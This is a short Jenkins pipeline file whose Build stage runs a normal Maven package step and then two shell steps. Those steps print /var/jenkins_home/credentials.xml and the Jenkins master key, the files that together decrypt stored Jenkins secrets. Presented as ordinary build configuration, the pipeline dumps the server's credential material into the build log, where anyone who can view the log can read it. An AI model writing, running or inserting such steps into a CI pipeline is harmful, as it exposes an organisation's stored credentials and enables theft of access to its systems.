pipeline {
    agent any
    stages {
        stage('Build') { 
            steps {
                sh 'mvn -B -DskipTests clean package' 
                sh 'cat /var/jenkins_home/credentials.xml' 
                sh 'cat /var/jenkins_home/secrets/master.key' 
            }
        }
    }
}
